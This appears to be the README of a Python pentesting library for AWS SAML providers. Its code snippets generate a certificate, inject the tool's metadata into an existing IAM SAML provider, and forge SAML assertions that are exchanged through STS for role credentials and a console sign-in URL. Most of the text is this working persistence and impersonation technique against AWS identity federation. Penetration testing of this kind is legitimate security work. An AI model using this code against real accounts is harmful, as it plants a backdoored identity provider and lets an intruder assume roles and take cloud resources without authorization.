# PseudoSAMLServer

PseudoSAMLServer is a small python library to aid in pentesting AWS SAML providers.

## Getting Started

Generate a provider and print the armored certificate data.
```py
import saml

saml.generate_provider()
print(saml.get_certificate())
```

Inject PseudoSAMLServer metadata into an existing metadata document.
```py
import boto3

from generate_saml_metadata import generate_saml_metadata
from inject_metadata import inject_metadata


def func(saml_provider_arn, certificate):
    client = boto3.client('iam')
    old = client.get_saml_provider(
        SAMLProviderArn=saml_provider_arn)['SAMLMetadataDocument']
    client.update_saml_provider(
        SAMLProviderArn=saml_provider_arn,
        SAMLMetadataDocument=inject_metadata(
            old,
            generate_saml_metadata(certificate=certificate)))
```

Print a signin URL.
```py
import boto3

from generate_saml_response import generate_saml_response
from generate_signin_url import generate_signin_url


def func(role_arn, saml_provider_arn, session_name):
    response = generate_saml_response(role_arn, saml_provider_arn, session_name)
    credentials = boto3.client('sts').assume_role_with_saml(
        RoleArn=role_arn,
        PrincipalArn=saml_provider_arn,
        SAMLAssertion=response)['Credentials']
    print(generate_signin_url(credentials))
```
